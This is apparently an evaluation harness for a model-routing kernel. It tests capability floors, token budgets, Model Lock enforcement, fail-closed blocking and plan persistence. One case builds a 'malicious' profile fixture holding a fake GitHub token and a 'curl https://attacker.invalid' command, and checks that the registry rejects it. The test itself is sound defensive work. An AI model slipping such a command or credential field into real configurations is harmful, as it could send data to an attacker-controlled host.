import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { createModelProfileRegistry, addModelProfiles, normalizeModelProfile } from "../kernel/model-registry.js";
import { computeWorkOrderRoutingDigest, routeModel } from "../kernel/model-router.js";
import { computeRuntimeIdentityDigest, conservativeRuntimeCapabilitySnapshot, RUNTIME_CAPABILITY_KEYS } from "../kernel/model-runtime.js";
import { isModelExecutionPlanCurrent, persistModelExecutionPlan, readCurrentModelExecutionPlanState } from "../kernel/model-persist.js";
import type { ModelProfile, RuntimeCapabilitySnapshot } from "../kernel/model-types.js";
import type { ContextPack } from "../kernel/intelligence-types.js";
import type { WorkOrder } from "../kernel/types.js";
import { ensureWorkspace } from "../lib/workspace.js";
import { findPackageRoot } from "../lib/version.js";

type EvalCase = { id: string; name: string };
const DIGEST = "a".repeat(64);

function profile(id: string, capabilityClass: ModelProfile["capabilityClass"], overrides: Record<string, unknown> = {}): ModelProfile {
  return normalizeModelProfile({
    schema: "uads.model-profile",
    schemaVersion: "0.8.0",
    profileId: id,
    providerId: "fixture-provider",
    modelId: `fixture-model-${id}`,
    status: "enabled",
    capabilityClass,
    reasoningClass: capabilityClass === "economy" ? "basic" : capabilityClass === "balanced" ? "standard" : capabilityClass === "strong" ? "advanced" : "deep",
    contextWindowTokens: 16_384,
    maxOutputTokens: 4_096,
    relativeCostClass: "medium",
    relativeLatencyClass: "medium",
    supports: { toolCalling: true, structuredOutput: true, vision: true, promptCache: true, explicitCache: true, persistentContext: true, usageTelemetry: true },
    constraints: { maxConcurrency: null },
    notes: "eval fixture",
    source: "builtin-fixture",
    adapterId: "eval-fixture",
    adapterVersion: "0.8.0",
    ...overrides,
  });
}

function runtime(overrides: Partial<RuntimeCapabilitySnapshot["capabilities"]> = {}, confidence: RuntimeCapabilitySnapshot["provenance"]["confidence"] = "proven"): RuntimeCapabilitySnapshot {
  const conservative = conservativeRuntimeCapabilitySnapshot({ runtimeId: "eval-runtime", adapterId: "eval-adapter", adapterVersion: "0.8.0" });
  const unsigned = {
    schema: conservative.schema,
    schemaVersion: conservative.schemaVersion,
    runtimeId: conservative.runtimeId,
    adapterId: conservative.adapterId,
    adapterVersion: conservative.adapterVersion,
    runtimeVersion: conservative.runtimeVersion,
    capabilities: { ...conservative.capabilities, ...overrides },
    provenance: { source: "test-fixture" as const, confidence },
  };
  return { ...unsigned, identityDigest: computeRuntimeIdentityDigest(unsigned) };
}

function capableRuntime(overrides: Partial<RuntimeCapabilitySnapshot["capabilities"]> = {}): RuntimeCapabilitySnapshot {
  return runtime({ modelSelection: true, toolCalling: true, structuredOutput: true, promptCache: true, explicitCache: true, persistentContext: true, subagents: true, parallelAgents: true, usageTelemetry: true, visionInput: true, ...overrides });
}

function workOrder(overrides: Partial<WorkOrder> = {}): WorkOrder {
  return {
    schema: "uads.work-order", schemaVersion: "0.2.0", workOrderId: "wo_eval_001", projectId: "project_eval", title: "Eval work order", objective: "Change a local implementation detail.", status: "planned", createdAt: "2026-01-01T00:00:00.000Z", updatedAt: "2026-01-01T00:00:00.000Z", intakeRef: "intake_eval", routingDecisionId: "rd_eval", scopeClass: "trivial", includedScope: ["src/index.ts"], outOfScope: [], recommendations: [], riskLevel: "LOW", riskReasons: [], domains: ["frontend"], affectedAreas: [], specialists: ["implementation-agent"], assuranceReviewers: ["independent-reviewer"], qualityGates: ["lint"], contextRadius: "C0", tokenBudget: { softLimit: 3_000, hardLimit: 8_000, capabilityClass: "economy", cachePreference: "prefer-cache", expansionPolicy: "bounded" }, dependencies: [], acceptanceCriteria: ["verified"], requiredEvidence: ["test output"], stopConditions: ["scope violation"], autonomyBoundary: { safeAutonomous: ["edit"], requiresApproval: ["release"] }, nextAction: "Implement.", ...overrides,
  };
}

function contextPack(estimatedTokens = 256): ContextPack {
  return { schema: "uads.context-pack", schemaVersion: "0.4.0", contextPackId: "cp_eval_001", projectId: "project_eval", workOrderId: "wo_eval_001", executionRunId: null, generatedAt: "2026-01-01T00:00:00.000Z", indexDigest: DIGEST, impactReportId: null, radius: "C0", estimatedTokens, staticLayerDigest: "b".repeat(64), semiStableLayerDigest: "c".repeat(64), dynamicLayerDigest: "d".repeat(64), sections: [] } as unknown as ContextPack;
}

function route(profiles: ModelProfile[], order = workOrder(), runtimeSnapshot = capableRuntime(), options: Record<string, unknown> = {}) {
  return routeModel({ projectId: order.projectId, workOrder: order, registry: createModelProfileRegistry(profiles), runtime: runtimeSnapshot, contextPack: contextPack(), ...options });
}

function assertEval(condition: unknown, message: string): asserts condition {
  if (!condition) throw new Error(message);
}

function runCase(id: string): void {
  if (id === "MR1") {
    const result = route([profile("economy", "economy"), profile("balanced", "balanced")]);
    assertEval(result.status === "SELECTED" && result.selectedProfileId === "economy", "economy was not selected");
  } else if (id === "MR2") {
    const order = workOrder({ tokenBudget: { ...workOrder().tokenBudget, capabilityClass: "balanced" } });
    const result = route([profile("economy", "economy"), profile("balanced", "balanced")], order);
    assertEval(result.selectedProfileId === "balanced" && result.rejections[0]?.reasonCodes.includes("CAPABILITY_CLASS_TOO_LOW"), "balanced floor failed");
  } else if (id === "MR3") {
    const order = workOrder({ riskLevel: "HIGH" });
    assertEval(route([profile("balanced", "balanced"), profile("strong", "strong")], order).selectedProfileId === "strong", "strong floor failed");
  } else if (id === "MR4") {
    const order = workOrder({ riskLevel: "CRITICAL", scopeClass: "architectural", tokenBudget: { ...workOrder().tokenBudget, capabilityClass: "critical" } });
    const result = route([profile("strong", "strong")], order);
    assertEval(result.status === "BLOCKED" && result.selectedProfileId === null, "critical work downgraded");
  } else if (id === "MR5" || id === "MR6") {
    const isTool = id === "MR5";
    const order = workOrder({ objective: isTool ? "Execute a shell command and report the result." : "Return structured JSON output matching the schema." });
    const unsupported = profile("unsupported", "balanced", { supports: { ...profile("nested", "balanced").supports, [isTool ? "toolCalling" : "structuredOutput"]: false } });
    const supported = profile("supported", "balanced");
    const result = route([unsupported, supported], order);
    assertEval(result.selectedProfileId === "supported", `${id} capability intersection failed`);
  } else if (id === "MR7") {
    const result = route([profile("tools", "balanced")], workOrder({ objective: "Execute a tool to inspect the repository." }), capableRuntime({ toolCalling: false }));
    assertEval(result.status === "BLOCKED" && result.rejections[0]?.reasonCodes.includes("RUNTIME_CAPABILITY_UNAVAILABLE"), "false runtime capability was accepted");
  } else if (id === "MR8") {
    const result = route([profile("economy", "economy")], workOrder(), runtime({ modelSelection: "unknown" }, "unknown"));
    assertEval(result.status === "BLOCKED", "unknown runtime was treated as proven");
  } else if (id === "MR9") {
    const result = route([profile("small", "economy", { contextWindowTokens: 1_000 })], workOrder(), capableRuntime(), { estimatedInputTokens: 600, requiredOutputTokens: 600 });
    assertEval(result.status === "BLOCKED" && result.rejections[0]?.reasonCodes.includes("CONTEXT_WINDOW_TOO_SMALL"), "small context was accepted");
  } else if (id === "MR10") {
    const result = route([profile("economy", "economy")], workOrder({ tokenBudget: { ...workOrder().tokenBudget, hardLimit: 1_000 } }), capableRuntime(), { estimatedInputTokens: 600, requiredOutputTokens: 600 });
    assertEval(result.status === "BLOCKED" && result.rejections[0]?.reasonCodes.includes("HARD_TOKEN_BUDGET_INCOMPATIBLE"), "hard budget was exceeded");
  } else if (id === "MR11" || id === "MR12") {
    const cheaper = profile("cheap", "balanced", { relativeCostClass: "low" });
    const other = profile("other", "balanced", { relativeCostClass: id === "MR11" ? "high" : "unknown" });
    const result = route([other, cheaper], workOrder({ tokenBudget: { ...workOrder().tokenBudget, capabilityClass: "balanced" } }));
    assertEval(result.selectedProfileId === "cheap", `${id} selected the wrong relative cost class`);
  } else if (id === "MR13") {
    const order = workOrder({ tokenBudget: { ...workOrder().tokenBudget, capabilityClass: "balanced" } });
    const first = route([profile("b", "balanced"), profile("a", "balanced")], order);
    const second = route([profile("a", "balanced"), profile("b", "balanced")], order);
    assertEval(first.planId === second.planId && first.selectedProfileId === second.selectedProfileId, "registry order changed routing");
  } else if (id === "MR14") {
    const result = route([profile("economy", "economy"), profile("balanced", "balanced"), profile("strong", "strong")], workOrder({ tokenBudget: { ...workOrder().tokenBudget, capabilityClass: "balanced" } }));
    assertEval(result.selectedProfileId === "balanced" && result.fallbackProfileIds.join(",") === "strong", "fallback lowered the quality floor");
  } else if (id === "MR15") {
    const order = workOrder();
    const prior = route([profile("balanced", "balanced"), profile("strong", "strong")], order);
    const result = route([profile("economy", "economy"), profile("balanced", "balanced"), profile("strong", "strong")], order, capableRuntime(), { previousPlan: prior, failureSignals: { loopDetected: true } });
    assertEval(result.requiredCapabilityClass === "balanced" && result.selectedProfileId === "balanced" && result.escalation.reasonCodes.includes("REPEATED_FAILURE_ESCALATION"), "failure escalation was not monotonic");
  } else if (id === "MR16") {
    const result = route([], workOrder({ riskLevel: "HIGH", tokenBudget: { ...workOrder().tokenBudget, capabilityClass: "strong" } }));
    assertEval(result.status === "BLOCKED" && result.blockedReason === "NO_ELIGIBLE_MODEL", "no-profile route did not fail closed");
  } else if (id === "MR17") {
    const result = route([profile("cache", "economy")]);
    assertEval(result.cacheHints.staticLayerDigest === "b".repeat(64) && result.cacheHints.promptCacheUsable, "cache hints were not layer-bound");
    assertEval(!JSON.stringify(result).match(/cacheHit|providerCacheId|cacheKey/i), "provider cache identity leaked into the plan");
  } else if (id === "MR18") {
    const result = route([profile("fallback", "economy")], workOrder(), capableRuntime({ parallelAgents: false, subagents: false, usageTelemetry: false }));
    assertEval(result.execution.parallel === false && result.execution.roleDispatch === "role-cycling" && result.execution.usageTelemetryAvailable === null, "runtime fallback metadata failed");
  } else if (id === "MR19") {
    const home = fs.mkdtempSync(path.join(os.tmpdir(), "uads-model-eval-home-"));
    const paths = ensureWorkspace("model-eval-security", home);
    const malicious = { ...profile("malicious", "economy"), apiKey: "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", command: "curl https://attacker.invalid" };
    let rejected = false;
    try { addModelProfiles(paths, malicious); } catch { rejected = true; }
    assertEval(rejected && !fs.existsSync(paths.modelRegistry), "malicious profile was accepted or persisted");
  } else if (id === "MR20") {
    const order = workOrder();
    const registry = createModelProfileRegistry([profile("economy", "economy")]);
    const runtimeSnapshot = capableRuntime();
    const plan = route(registry.profiles, order, runtimeSnapshot);
    const common = { plan, projectId: order.projectId, workOrderId: order.workOrderId, workOrderDigest: computeWorkOrderRoutingDigest(order), registryDigest: registry.registryDigest, runtimeIdentityDigest: runtimeSnapshot.identityDigest, policyDigest: plan.policyDigest, changeDigest: null };
    assertEval(isModelExecutionPlanCurrent(common), "fresh plan was rejected");
    assertEval(!isModelExecutionPlanCurrent({ ...common, runtimeIdentityDigest: capableRuntime({ usageTelemetry: false }).identityDigest }), "stale runtime plan remained current");
  } else if (id === "MR21") {
    const result = route([profile("host-dispatch", "economy", { supports: { ...profile("nested", "economy").supports, toolCalling: false, structuredOutput: false, promptCache: false, explicitCache: false, persistentContext: false, usageTelemetry: false, vision: false } })], workOrder(), runtime({ modelSelection: true, subagents: true, parallelAgents: false }));
    assertEval(result.status === "SELECTED" && result.execution.roleDispatch === "subagents", "host runtime subagent capability was incorrectly gated by model supports");
  } else if (id === "MR22") {
    const unconstrained = route([profile("host-parallel", "economy", { constraints: { maxConcurrency: null } })], workOrder(), runtime({ modelSelection: true, subagents: false, parallelAgents: true }));
    assertEval(unconstrained.status === "SELECTED" && unconstrained.execution.parallel === true, "host runtime parallel capability was not selected");
    const constrained = route([profile("serial-only", "economy", { constraints: { maxConcurrency: 1 } })], workOrder(), runtime({ modelSelection: true, subagents: false, parallelAgents: true }));
    assertEval(constrained.status === "SELECTED" && constrained.execution.parallel === false, "maxConcurrency=1 did not disable parallel execution");
  } else if (id === "MR23") {
    const profiles = [profile("economy", "economy"), profile("balanced", "balanced", { relativeCostClass: "high" }), profile("strong", "strong")];
    const unlocked = route(profiles);
    assertEval(unlocked.selectedProfileId === "economy", "unlocked baseline did not prefer economy");
    const locked = route(profiles, workOrder(), capableRuntime(), { lockState: { status: "CURRENT", mode: "MODEL_LOCK", locked: { profileId: "balanced", providerId: "fixture-provider", modelId: "fixture-model-balanced" }, lockRevision: 3 } });
    assertEval(locked.status === "SELECTED" && locked.selectedProfileId === "balanced", "active Model Lock did not force the locked profile");
    assertEval(locked.modelLock.active === true && locked.modelLock.revision === 3 && locked.modelLock.profileId === "balanced", "Model Lock block was not recorded");
    assertEval(locked.routingEnforcement.state === "ENFORCED" && locked.selectionReasonCodes.includes("MODEL_LOCK_ENFORCED"), "enforcement was not projected as ENFORCED");
    assertEval(locked.fallbackProfileIds.length === 0, "locked routing exposed fallback substitution");
    assertEval(locked.modelLock.reasonCodes.includes("MODEL_LOCK_FALLBACK_FORBIDDEN"), "suppressed fallbacks were not recorded");
  } else if (id === "MR24") {
    const profiles = [profile("economy", "economy"), profile("balanced", "balanced")];
    const missing = route(profiles, workOrder(), capableRuntime(), { lockState: { status: "CURRENT", mode: "MODEL_LOCK", locked: { profileId: "absent", providerId: "fixture-provider", modelId: "fixture-model-absent" }, lockRevision: 5 } });
    assertEval(missing.status === "BLOCKED" && missing.blockedReason === "MODEL_LOCK_UNAVAILABLE", "unresolvable lock did not fail closed");
    assertEval(missing.selectedProfileId === null && missing.fallbackProfileIds.length === 0 && missing.eligibleCandidates.length === 0, "unresolvable lock substituted another profile");
    assertEval(missing.modelLock.reasonCodes.includes("MODEL_LOCK_ALIAS_UNSUPPORTED"), "alias-unsupported reason was not recorded");
    const inadmissible = route([profile("tiny", "economy", { contextWindowTokens: 1_000 }), profile("ok", "economy")], workOrder(), capableRuntime(), { estimatedInputTokens: 600, requiredOutputTokens: 600, lockState: { status: "CURRENT", mode: "MODEL_LOCK", locked: { profileId: "tiny", providerId: "fixture-provider", modelId: "fixture-model-tiny" }, lockRevision: 6 } });
    assertEval(inadmissible.status === "BLOCKED" && inadmissible.blockedReason === "MODEL_LOCK_UNAVAILABLE", "inadmissible locked profile did not fail closed");
    assertEval(inadmissible.rejections.some((item) => item.profileId === "tiny" && item.reasonCodes.includes("MODEL_LOCK_UNAVAILABLE") && item.reasonCodes.includes("CONTEXT_WINDOW_TOO_SMALL")), "inadmissible lock rejection detail missing");
    assertEval(inadmissible.routingEnforcement.state === "UNKNOWN" && inadmissible.routingEnforcement.reasonCodes.includes("NO_HOST_EXECUTION_EVIDENCE"), "blocked lock did not render UNKNOWN enforcement");
  } else if (id === "MR25") {
    const result = route([profile("economy", "economy")], workOrder(), capableRuntime(), { lockState: { status: "UNAVAILABLE", reasonCodes: ["ROUTING_STATE_DIGEST_INVALID"] } });
    assertEval(result.status === "BLOCKED" && result.blockedReason === "ROUTING_STATE_UNAVAILABLE", "unavailable routing state did not fail closed");
    assertEval(result.modelLock.active === false && result.routingMode === "QUALITY_FLOOR_AUTOROUTE" && result.modelLock.revision === 0, "unavailable routing state silently unlocked routing");
    assertEval(result.routingEnforcement.state === "UNKNOWN" && result.routingEnforcement.reasonCodes.includes("ROUTING_STATE_UNAVAILABLE"), "unavailable routing state rendered an enforcement claim");
    assertEval(result.selectedProfileId === null && result.fallbackProfileIds.length === 0, "unavailable routing state still produced a target");
  } else if (id === "MR26") {
    const profiles = [profile("economy", "economy"), profile("balanced", "balanced")];
    const broadcast = route(profiles, workOrder(), capableRuntime(), { requestedModelTargets: 2 });
    assertEval(broadcast.status === "BLOCKED" && broadcast.blockedReason === "ENSEMBLE_NOT_AUTHORIZED", "broadcast request was not rejected");
    assertEval(broadcast.selectedProfileId === null && broadcast.eligibleCandidates.length === 0, "broadcast request still produced a model target");
    const zero = route(profiles, workOrder(), capableRuntime(), { requestedModelTargets: 0 });
    assertEval(zero.status === "BLOCKED" && zero.blockedReason === "ENSEMBLE_NOT_AUTHORIZED", "zero-target request was accepted");
    const single = route(profiles);
    assertEval(single.status === "SELECTED" && single.selectedProfileId === "economy", "default single-target routing regressed");
    const selectedModelIds = new Set(single.roleSelections.map((item) => item.modelId).filter((value): value is string => Boolean(value)));
    assertEval(selectedModelIds.size === 1, "routing emitted more than one model target");
  } else if (id === "MR27") {
    const order = workOrder({ tokenBudget: { ...workOrder().tokenBudget, capabilityClass: "balanced" } });
    const priced = route([profile("cheap", "balanced", { relativeCostClass: "low" }), profile("mid", "balanced", { relativeCostClass: "medium" }), profile("high", "balanced", { relativeCostClass: "high" })], order, capableRuntime(), { lockState: { status: "CURRENT", mode: "CHEAPEST_QUALIFIED", locked: null, lockRevision: 2 } });
    assertEval(priced.routingMode === "CHEAPEST_QUALIFIED" && priced.selectedProfileId === "cheap", "cheapest qualified did not select the least-cost admissible profile");
    assertEval(priced.selectionReasonCodes.includes("CHEAPEST_QUALIFIED_SELECTED"), "objective price evidence did not produce a cheapest claim");
    const unpriced = route([profile("opaque-a", "balanced", { relativeCostClass: "unknown" }), profile("opaque-b", "balanced", { relativeCostClass: "unknown" })], order, capableRuntime(), { lockState: { status: "CURRENT", mode: "CHEAPEST_QUALIFIED", locked: null, lockRevision: 2 } });
    assertEval(unpriced.status === "SELECTED" && !unpriced.selectionReasonCodes.includes("CHEAPEST_QUALIFIED_SELECTED"), "unknown price produced a cheapest claim");
    assertEval(unpriced.selectionReasonCodes.includes("CHEAPEST_QUALIFIED_COST_EVIDENCE_UNKNOWN"), "unknown price evidence was not surfaced");
  } else if (id === "MR28") {
    const explicit = route([profile("economy", "economy")]);
    assertEval(explicit.capabilityTruth.adapterId === "eval-adapter", "explicit adapter identity was not carried into capability truth");
    assertEval(explicit.capabilityTruth.capabilities.modelSelection === "SUPPORTED", "supported capability was not projected as SUPPORTED");
    assertEval(!explicit.capabilityTruth.reasonCodes.includes("CAPABILITY_TRUTH_ADAPTER_UNSPECIFIED"), "explicit adapter truth was marked unspecified");
    const unspecified = route([profile("economy", "economy")], workOrder(), conservativeRuntimeCapabilitySnapshot());
    assertEval(unspecified.status === "BLOCKED", "adapter-unspecified runtime was treated as enabling");
    assertEval(unspecified.capabilityTruth.adapterId === null && unspecified.capabilityTruth.reasonCodes.includes("CAPABILITY_TRUTH_ADAPTER_UNSPECIFIED"), "adapter-unspecified truth was not flagged");
    assertEval(Object.values(unspecified.capabilityTruth.capabilities).every((value) => value === "UNKNOWN"), "conservative snapshot produced non-UNKNOWN capability truth");
    assertEval(Object.keys(unspecified.capabilityTruth.capabilities).sort().join(",") === [...RUNTIME_CAPABILITY_KEYS].sort().join(","), "capability truth key set drifted");
  } else if (id === "MR29") {
    const first = route([profile("economy", "economy")]);
    const second = route([profile("economy", "economy")]);
    assertEval(first.schemaVersion === "0.9.0", "plan schema version did not advance to 0.9.0");
    assertEval(capableRuntime().schemaVersion === "0.8.0", "runtime capability snapshot contract version moved");
    assertEval(first.routingMode === "QUALITY_FLOOR_AUTOROUTE" && first.modelLock.active === false && first.modelLock.revision === 0, "default routing mode/lock block was not recorded");
    assertEval(first.routingEnforcement.state === "UNKNOWN" && first.routingEnforcement.reasonCodes.includes("NO_ACTIVE_LOCK"), "inactive lock enforcement truth was not UNKNOWN");
    assertEval(first.planId === second.planId, "identical inputs produced different plan ids");
    const text = JSON.stringify(first);
    assertEval(!text.includes("ghp_"), "plan leaked secret-like data");
    const backslash = String.fromCharCode(92);
    assertEval(!text.includes("C:" + backslash) && !text.includes("/home/") && !text.includes("/Users/"), "plan leaked absolute host paths");
  } else if (id === "MR30") {
    const home = fs.mkdtempSync(path.join(os.tmpdir(), "uads-model-eval-plan-"));
    const paths = ensureWorkspace("model-eval-plan-state", home);
    fs.writeFileSync(paths.currentModelRouting, JSON.stringify({ schema: "uads.model-execution-plan", schemaVersion: "0.8.0" }), "utf8");
    const legacy = readCurrentModelExecutionPlanState(paths);
    assertEval(legacy.status === "LEGACY" && legacy.observedSchemaVersion === "0.8.0" && legacy.reasonCode === "PLAN_SCHEMA_LEGACY", "prior-schema plan did not degrade truthfully");
    fs.writeFileSync(paths.currentModelRouting, "{ not-json", "utf8");
    const corrupt = readCurrentModelExecutionPlanState(paths);
    assertEval(corrupt.status === "UNAVAILABLE" && corrupt.reasonCodes.includes("PLAN_UNAVAILABLE"), "corrupt plan was not reported unavailable");
    fs.writeFileSync(paths.currentModelRouting, JSON.stringify({ schema: "uads.model-execution-plan", schemaVersion: "0.9.0", note: "C:" + String.fromCharCode(92) + "Users" + String.fromCharCode(92) + "operator" }), "utf8");
    const unsafe = readCurrentModelExecutionPlanState(paths);
    assertEval(unsafe.status === "UNAVAILABLE" && unsafe.reasonCodes.includes("PLAN_UNSAFE_CONTENT"), "unsafe plan content was not rejected");
    const plan = route([profile("economy", "economy")]);
    persistModelExecutionPlan(paths, plan);
    const current = readCurrentModelExecutionPlanState(paths);
    assertEval(current.status === "CURRENT" && current.plan.planId === plan.planId, "current-schema plan was not readable after persist");
  } else if (id === "MR31") {
    const proven = profile("model-v1", "balanced");
    const unproven = profile("model-v2", "balanced", { supports: { ...profile("nested", "balanced").supports, toolCalling: false } });
    const order = workOrder({ objective: "Execute a shell command and report the result." });
    const result = route([proven, unproven], order);
    assertEval(result.selectedProfileId === "model-v1", "unproven successor model was authorized by ordering");
    assertEval(result.rejections.some((item) => item.profileId === "model-v2" && item.reasonCodes.includes("RUNTIME_CAPABILITY_UNAVAILABLE")), "unproven successor rejection was not recorded");
  } else {
    throw new Error(`unknown model-routing eval case ${id}`);
  }
}

export function runModelRoutingEvals(): number {
  const casesPath = path.join(findPackageRoot(), "evals", "model-routing", "cases.json");
  const cases = JSON.parse(fs.readFileSync(casesPath, "utf8")) as EvalCase[];
  let failures = 0;
  for (const item of cases) {
    try {
      runCase(item.id);
      process.stdout.write(`${item.id} PASS ${item.name}\n`);
    } catch (error) {
      failures += 1;
      process.stdout.write(`${item.id} FAIL ${item.name}: ${error instanceof Error ? error.message : String(error)}\n`);
    }
  }
  process.stdout.write(`model routing eval ${cases.length - failures}/${cases.length}\n`);
  return failures === 0 ? 0 : 1;
}

if (process.argv[1] && path.normalize(path.resolve(process.argv[1])) === path.normalize(fileURLToPath(import.meta.url))) {
  process.exitCode = runModelRoutingEvals();
}
